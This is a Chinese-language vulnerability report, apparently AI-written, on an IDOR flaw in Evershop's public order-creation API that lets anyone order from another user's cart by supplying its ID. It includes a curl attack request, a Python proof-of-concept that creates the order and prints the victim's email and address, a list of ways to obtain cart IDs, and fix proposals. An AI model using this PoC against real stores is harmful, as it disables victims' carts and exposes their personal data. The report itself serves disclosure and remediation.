# Evershop createOrder 使用他人购物车创建订单漏洞报告

## 1. 漏洞挖掘目标

- **受影响系统/产品**：Evershop E-commerce Platform
- **受影响版本**：2.1.0 及之前版本
- **仓库地址**：https://github.com/evershopcommerce/evershop

## 2. 漏洞说明

### 2.1 漏洞描述

- **漏洞类型**：不安全的直接对象引用 (IDOR, CWE-639) + 业务逻辑漏洞
- **漏洞名称**：Evershop createOrder API 使用任意购物车创建订单漏洞
- **风险等级**：高危
- **概述**：`POST /orders` API 端点配置为公开访问，接受 `cart_id` 参数创建订单。系统仅验证购物车是否存在和有效，未验证请求者是否为购物车所有者。攻击者可使用其他用户的购物车ID创建订单，导致：(1) 他人购物车被清空；(2) 订单信息泄露；(3) 业务逻辑被滥用。

### 2.2 利用前提与特征

- **利用难度**：中
- **权限要求**：无需认证
- **操作条件**：
  1. 获取目标用户的购物车UUID
  2. 购物车状态有效且包含商品
- **攻击特征**：使用他人的cart_id发起订单创建请求

### 2.3 漏洞效果

漏洞攻击成功后的效果如下：

1. **购物车劫持**：使用他人精心挑选的购物车创建订单
2. **购物车清空**：订单创建后目标用户的购物车被禁用
3. **地址信息泄露**：订单响应中包含收货地址等敏感信息
4. **业务损失**：可能导致库存异常、订单纠纷

## 3. 漏洞复现

- **是否可以制作成自动化复现脚本**：是

### 3.1 漏洞复现过程

**步骤1：确认路由配置**

文件：`packages/evershop/src/modules/checkout/api/createOrder/route.json`
```json
{
  "methods": ["POST"],
  "path": "/orders",
  "access": "public"
}
```

**步骤2：分析Handler逻辑**

文件：`packages/evershop/src/modules/checkout/api/createOrder/placeOrder.js`
```javascript
export default async (request, response, next) => {
  try {
    const { cart_id } = request.body;  // 用户可控

    // 获取购物车 - 仅验证存在性
    const cart = await getCartByUUID(cart_id);
    if (!cart) {
      response.status(INVALID_PAYLOAD);
      response.json({ error: { message: 'Invalid cart' }});
      return;
    }

    // 检查购物车错误状态
    if (cart.hasError()) {
      const errors = cart.getErrors();
      response.status(INVALID_PAYLOAD);
      response.json({ error: { message: Object.values(errors)[0] }});
      return;
    }

    // 创建订单 - 未验证购物车所有权！
    const { uuid: orderId } = await createOrder(cart);

    // 返回订单详情（包含地址信息）
    const order = await select().from('order').where('uuid', '=', orderId).load(pool);
    // ...
  }
};
```

**步骤3：追踪getCartByUUID实现**

文件：`packages/evershop/src/modules/checkout/services/getCartByUUID.ts`
```typescript
export const getCartByUUID = async (uuid: string): Promise<Cart> => {
  const cart = await getCart(uuid);  // 仅按UUID查询
  return cart;
};
```

文件：`packages/evershop/src/modules/checkout/services/cart/Cart.js`
```javascript
async function getCart(uuid) {
  const cart = await select()
    .from('cart')
    .where('uuid', '=', uuid)  // 仅检查UUID
    .load(pool);

  if (!cart || cart.status !== true) {
    throw new Error('Cart not found');
  }
  // ...无customer_id验证
}
```

**步骤4：分析订单创建后的购物车处理**

文件：`packages/evershop/src/modules/checkout/services/orderCreator.ts`
```typescript
async function disableCart(cartId: number, connection: PoolClient) {
  const cart = await update('cart')
    .given({ status: false })  // 禁用购物车
    .where('cart_id', '=', cartId)
    .execute(connection);
  return cart;
}
```

**步骤5：发送攻击请求**

```bash
# 使用他人的购物车ID创建订单
curl -X POST 'https://target.com/api/orders' \
  -H 'Content-Type: application/json' \
  -d '{
    "cart_id": "victim-cart-uuid-here"
  }'
```

**预期响应**（订单创建成功）：
```json
{
  "data": {
    "uuid": "new-order-uuid",
    "order_number": 10001,
    "customer_email": "victim@example.com",
    "shipping_address": {
      "full_name": "Victim Name",
      "address_1": "123 Victim Street",
      "city": "Victim City",
      "postcode": "12345"
    }
  }
}
```

## 4. 漏洞利用

- **是否可以制作成自动化复现脚本**：是

### 4.1 利用脚本

```python
#!/usr/bin/env python3
"""
Evershop Cart Hijacking PoC
利用他人购物车创建订单
"""

import requests
import json

class CartHijacker:
    def __init__(self, target_url):
        self.target_url = target_url

    def create_order_with_cart(self, cart_id):
        """
        使用指定购物车ID创建订单
        """
        endpoint = f"{self.target_url}/api/orders"

        payload = {
            "cart_id": cart_id
        }

        response = requests.post(endpoint, json=payload)

        if response.status_code == 200:
            order_data = response.json().get('data', {})
            print("[+] 订单创建成功!")
            print(f"    订单号: {order_data.get('order_number')}")
            print(f"    订单UUID: {order_data.get('uuid')}")
            print(f"    客户邮箱: {order_data.get('customer_email')}")

            # 提取泄露的地址信息
            shipping = order_data.get('shipping_address', {})
            if shipping:
                print("[+] 获取到收货地址:")
                print(f"    姓名: {shipping.get('full_name')}")
                print(f"    地址: {shipping.get('address_1')}")
                print(f"    城市: {shipping.get('city')}")
                print(f"    邮编: {shipping.get('postcode')}")

            return order_data
        else:
            print(f"[-] 订单创建失败: {response.status_code}")
            print(f"    响应: {response.text}")
            return None

    def enumerate_carts(self, cart_id_prefix, count=100):
        """
        尝试枚举有效的购物车ID
        注：UUID不可预测，此方法仅作演示
        """
        valid_carts = []
        for i in range(count):
            cart_id = f"{cart_id_prefix}{i:04d}"
            # 这里需要一个验证购物车存在的API
            # 实际攻击中需要通过其他方式获取cart_id
        return valid_carts


def main():
    target = "https://shop.example.com"
    victim_cart_id = "a1b2c3d4e5f6g7h8i9j0k1l2m3n4o5p6"

    hijacker = CartHijacker(target)

    print(f"[*] 目标: {target}")
    print(f"[*] 购物车ID: {victim_cart_id}")
    print()

    # 使用受害者购物车创建订单
    order = hijacker.create_order_with_cart(victim_cart_id)

    if order:
        print()
        print("[!] 攻击成功!")
        print("[!] 受害者购物车已被清空")
        print("[!] 受害者地址信息已泄露")


if __name__ == "__main__":
    main()
```

### 4.2 购物车ID获取方式

```python
def possible_cart_id_sources():
    """
    可能获取他人购物车ID的渠道
    """
    sources = [
        "1. 前端JavaScript代码中的硬编码测试ID",
        "2. 公开的GraphQL introspection泄露",
        "3. 错误信息中的cart_id泄露",
        "4. 共享链接中的cart_id参数",
        "5. 浏览器缓存或localStorage泄露",
        "6. 日志文件中的cart_id",
        "7. 网络流量捕获（中间人攻击）"
    ]
    return sources
```

## 5. 漏洞原理

### 5.1 数据流分析

```
┌────────────────────────────────────────────────────────────────┐
│              购物车劫持订单创建数据流                            │
├────────────────────────────────────────────────────────────────┤
│                                                                │
│  攻击者                          受害者                        │
│    │                               │                          │
│    │                               ▼                          │
│    │                        [创建购物车]                       │
│    │                        [添加商品]                         │
│    │                        [设置地址]                         │
│    │                               │                          │
│    │      ┌────────────────────────┘                          │
│    │      │ 通过某种方式获取cart_id                            │
│    │      ▼                                                   │
│    │   cart_id: "victim-cart-uuid"                            │
│    │      │                                                   │
│    ▼      ▼                                                   │
│  ┌─────────────────────────────────────────────┐              │
│  │ POST /orders                                 │              │
│  │ { "cart_id": "victim-cart-uuid" }           │              │
│  └─────────────────────────────────────────────┘              │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────────┐              │
│  │ placeOrder.js                               │              │
│  │                                             │              │
│  │ 1. getCartByUUID(cart_id)                   │              │
│  │    → 查询购物车 ✓                            │              │
│  │    → 验证存在性 ✓                            │              │
│  │    → 验证所有权 ✗ (缺失!)                    │              │
│  │                                             │              │
│  │ 2. createOrder(cart)                        │              │
│  │    → 保存订单和地址                          │              │
│  │    → 保存订单商品                            │              │
│  │    → disableCart() ← 受害者购物车被禁用!     │              │
│  └─────────────────────────────────────────────┘              │
│            │                                                   │
│            ▼                                                   │
│  ┌─────────────────────────────────────────────┐              │
│  │ 响应：订单详情                               │              │
│  │ - 订单号                                    │              │
│  │ - 受害者邮箱 ← 信息泄露!                     │              │
│  │ - 收货地址 ← 信息泄露!                       │              │
│  └─────────────────────────────────────────────┘              │
│                                                                │
│  后果：                                                        │
│  1. 受害者发现购物车被清空                                     │
│  2. 攻击者获得受害者个人信息                                    │
│  3. 可能产生虚假订单                                           │
│                                                                │
└────────────────────────────────────────────────────────────────┘
```

### 5.2 根因分析

1. **路由公开访问**：`access="public"` 无需认证
2. **缺失所有权验证**：`getCartByUUID` 仅查询存在性
3. **购物车与用户绑定不强**：cart表未强制关联customer_id验证

## 6. 修复建议

### 6.1 方案A：购物车绑定会话

```javascript
// placeOrder.js
export default async (request, response, next) => {
  const { cart_id } = request.body;

  // 获取当前会话的购物车
  const sessionCartId = request.session?.cartId;

  // 验证请求的cart_id与会话匹配
  if (cart_id !== sessionCartId) {
    response.status(FORBIDDEN);
    response.json({
      error: { message: 'You can only checkout your own cart' }
    });
    return;
  }

  // 原有逻辑...
};
```

### 6.2 方案B：购物车绑定用户

```typescript
// getCartByUUID.ts - 添加用户验证
export const getCartByUUID = async (
  uuid: string,
  customerId?: number
): Promise<Cart> => {
  const cartQuery = select()
    .from('cart')
    .where('uuid', '=', uuid)
    .and('status', '=', true);

  // 如果提供了customerId，验证归属
  if (customerId) {
    cartQuery.and('customer_id', '=', customerId);
  }

  const cart = await cartQuery.load(pool);

  if (!cart) {
    throw new Error('Cart not found or access denied');
  }

  return new Cart(cart);
};
```

### 6.3 方案C：订单创建需认证

```json
// route.json
{
  "methods": ["POST"],
  "path": "/orders",
  "access": "private"
}
```

```javascript
// placeOrder.js
const currentCustomer = request.getCurrentCustomer();
if (!currentCustomer) {
  return response.status(401).json({
    error: { message: 'Please login to checkout' }
  });
}

const cart = await getCartByUUID(cart_id);
if (cart.getData('customer_id') !== currentCustomer.customer_id) {
  return response.status(403).json({
    error: { message: 'Cart does not belong to you' }
  });
}
```

---

**报告编写日期**：2026-01-04
**分析师**：Claude Code Security Analyzer
